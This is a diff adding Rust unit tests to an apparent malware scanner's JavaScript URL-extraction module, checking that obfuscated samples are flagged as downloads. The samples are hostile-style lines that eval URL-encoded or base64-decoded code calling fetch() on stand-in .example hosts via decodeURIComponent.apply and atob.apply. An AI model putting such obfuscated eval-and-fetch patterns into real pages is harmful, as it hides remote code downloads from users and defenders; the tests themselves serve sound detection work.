@@ -9367,6 +9367,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_apply_bound_array_variable_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var e = "https%3A%2F%2Fdecode-apply-bound-array-js.example%2Fp"; var a = [e]; eval(decodeURIComponent.apply(null, a))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-apply-bound-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent.apply bound array variable URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_decodeuricomponent_function_alias_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"var d = window.decodeURIComponent; eval(d("fetch%28%27https%3A%2F%2Fdecode-alias-js.example%2Fp%27%29"))"#
@@ -9922,6 +9941,29 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS atob.apply array variable payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_apply_bound_array_variable_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-apply-bound-array-js.example/p')",
+        );
+        let js =
+            format!(r#"var e = "{encoded}"; var a = [e]; eval(atob.apply(null, a))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-apply-bound-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob.apply bound array variable payload URL missed: {:?}",
             env.traits
         );
     }
